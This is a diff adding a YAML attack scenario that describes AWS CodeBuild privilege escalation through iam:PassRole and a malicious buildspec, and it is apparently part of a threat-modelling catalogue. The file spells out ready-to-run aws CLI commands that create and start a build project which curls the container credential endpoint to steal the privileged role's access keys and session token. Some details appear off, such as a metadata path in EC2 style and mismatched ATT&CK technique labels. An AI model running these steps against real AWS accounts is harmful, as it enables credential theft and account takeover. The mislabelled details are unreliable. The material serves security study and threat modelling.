@@ -1,0 +1,55 @@
+attack:
+  id: AWS-CODEBUILD-PRIVESC-001
+  name: CodeBuild Privilege Escalation via IAM PassRole and Malicious Buildspec
+  overview: |
+    An attacker with iam:PassRole and codebuild:CreateProject permissions can create a malicious AWS CodeBuild project that executes arbitrary commands under a privileged IAM service role. By embedding commands in the buildspec configuration, the attacker causes the build container to execute attacker-controlled code with elevated permissions. The CodeBuild container exposes temporary role credentials through the instance metadata service (169.254.170.2), allowing the attacker to retrieve AWS credentials associated with the service role. These credentials enable unauthorized actions across the AWS environment, leading to privilege escalation, lateral movement, or data exfiltration.
+  steps:
+    - title: Create Malicious CodeBuild Project with Embedded Credential Extraction
+      command: |
+        aws codebuild create-project \
+          --name malicious-build \
+          --source type=NO_SOURCE,buildspec="version: 0.2
+        phases:
+          build:
+            commands:
+              - curl http://169.254.170.2/latest/meta-data/iam/security-credentials/ \
+              - curl http://169.254.170.2/latest/meta-data/iam/security-credentials/$(curl http://169.254.170.2/latest/meta-data/iam/security-credentials/ -s)" \
+          --artifacts type=NO_ARTIFACTS \
+          --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL \
+          --service-role arn:aws:iam::<ACCOUNT_ID>:role/<PRIVILEGED_ROLE>
+      dependencies:
+        - iam:PassRole permission on target privileged role
+        - codebuild:CreateProject permission
+        - Target role must have trust relationship with CodeBuild service
+        - Network access to instance metadata service endpoint (169.254.170.2)
+      result: |
+        Malicious CodeBuild project is successfully created with a buildspec that extracts temporary AWS credentials from the instance metadata service. The project is configured to assume the privileged role's identity when executed.
+      ttp: T1548.004 Abuse Elevation Control Mechanism - Use Alternate Authentication Material
+    - title: Start CodeBuild Project Execution
+      command: |
+        aws codebuild start-build \
+          --project-name malicious-build
+      dependencies:
+        - codebuild:StartBuild permission (or codebuild:BatchStartBuilds)
+        - Malicious CodeBuild project created in previous step
+        - Sufficient CodeBuild compute capacity available
+      result: |
+        CodeBuild project execution begins, and the build container starts executing the buildspec commands. The container queries the metadata service and retrieves the temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) associated with the privileged IAM role.
+      ttp: T1204.001 User Execution - Malicious Link
+    - title: Extract and Exfiltrate Temporary Credentials
+      command: |
+        # Commands executed within CodeBuild container during build phase
+        ROLE_NAME=$(curl -s http://169.254.170.2/latest/meta-data/iam/security-credentials/)
+        curl -s http://169.254.170.2/latest/meta-data/iam/security-credentials/${ROLE_NAME}
+        # Output contains JSON with AccessKeyId, SecretAccessKey, and SessionToken
+      dependencies:
+        - CodeBuild build execution in progress
+        - Buildspec configured with credential extraction commands
+        - Instance metadata service access from build container
+        - Attacker ability to access build logs or exfiltrate data via outbound channel
+      result: |
+        Temporary AWS credentials with the privileges of the service role are extracted from the metadata service response. These credentials can be captured from CodeBuild logs, exfiltrated to attacker-controlled infrastructure, or used immediately to make API calls within the AWS environment. The attacker gains full access to AWS resources permitted by the role's policies.
+      ttp: T1528 Steal Application Access Token
+  stride_goal:
+    - Elevation of Privilege
+    - Information Disclosure
